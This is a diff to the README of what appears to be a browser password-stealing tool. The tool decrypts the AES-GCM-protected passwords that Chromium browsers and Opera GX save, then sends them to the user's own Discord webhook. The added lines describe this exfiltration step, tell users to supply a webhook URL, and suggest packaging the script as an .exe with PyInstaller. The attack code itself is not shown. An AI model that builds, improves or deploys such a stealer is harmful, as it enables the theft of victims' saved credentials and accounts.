@@ -18,6 +18,7 @@ Individual passwords are encrypted using AES-GCM with this master key and stored
 
 Opera (GX here) is a Chromium-based browser, so the process is the same, only the local directory name is different.
 
+Once the passwords are decrypted, depending on the intended use, it can be helpful to implement an extraction method to retrieve the extracted passwords. In this case, I opted to use a Discord webhook for sending revealed passwords.
 
 **Documentations** :
 - [https://superuser.com/questions/146742/how-does-google-chrome-store-passwords](https://superuser.com/questions/146742/how-does-google-chrome-store-passwords)
@@ -49,7 +50,7 @@ Opera (GX here) is a Chromium-based browser, so the process is the same, only th
 ## Usability
 For extract data put your own discord webhook.
 ```
-webhook_url = "https://discord.com/api/webhooks/[....]"
+webhook_url = "..."
 ```
 
 You can use PiInstaller to make an application file (.exe) from your python script like this
